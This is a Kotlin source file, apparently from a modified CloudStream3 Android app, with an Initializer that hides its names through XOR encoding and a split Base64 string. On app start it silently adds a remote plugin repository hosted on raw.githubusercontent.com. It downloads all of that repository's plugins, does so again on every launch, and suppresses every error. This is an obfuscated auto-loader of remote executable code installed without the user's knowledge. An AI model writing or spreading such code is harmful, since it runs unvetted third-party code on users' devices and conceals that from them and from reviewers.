package com.lagradost.cloudstream3

import android.app.Activity
import android.util.Base64
import com.lagradost.cloudstream3.plugins.RepositoryManager
import com.lagradost.cloudstream3.ui.settings.extensions.PluginsViewModel
import com.lagradost.cloudstream3.ui.settings.extensions.RepositoryData
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

object Initializer {

    const val NEED_AUTO_DOWNLOAD = "need_auto_download_v1"
    private const val AUTO_REPO_FLAG = "auto_repo_added_v1"

    private fun decode(data: IntArray, key: Int = 7): String {
        val out = CharArray(data.size)
        for (i in data.indices) {
            out[i] = (data[i] xor key).toChar()
        }
        return String(out)
    }

    private val PREFS_NAME = intArrayOf(
        100, 107, 104, 114, 99, 116, 115, 114, 101, 102, 106
    )

    private val REPO_NAME = intArrayOf(
        66, 115, 115, 68, 107, 114, 99
    )

    // Base64 URL repo.json (BENAR)
    private const val P1 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNl"
    private const val P2 = "cmNvbnRlbnQuY29tL0dpbGFu"
    private const val P3 = "Z0FkaXRhbWEvTm9udG9ubW92"
    private const val P4 = "aWVzL21haW4vcmVwby5qc29u"

    private fun repoUrl(): String {
        val encoded = P1 + P2 + P3 + P4
        return String(Base64.decode(encoded, Base64.DEFAULT))
    }

    fun start(activity: Activity) {
        val prefs = activity.getSharedPreferences(
            decode(PREFS_NAME),
            Activity.MODE_PRIVATE
        )

        val repo = RepositoryData(
            name = decode(REPO_NAME),
            url = repoUrl(),
            iconUrl = null
        )

        CoroutineScope(Dispatchers.IO).launch {
            try {
                if (!prefs.getBoolean(AUTO_REPO_FLAG, false)) {
                    RepositoryManager.addRepository(repo)

                    PluginsViewModel.downloadAll(activity, repo.url, null)

                    prefs.edit()
                        .putBoolean(AUTO_REPO_FLAG, true)
                        .putBoolean(NEED_AUTO_DOWNLOAD, false)
                        .apply()
                }

                // force refresh plugin (.cs3)
                PluginsViewModel.downloadAll(activity, repo.url, null)

            } catch (_: Throwable) {
            }
        }
    }
}
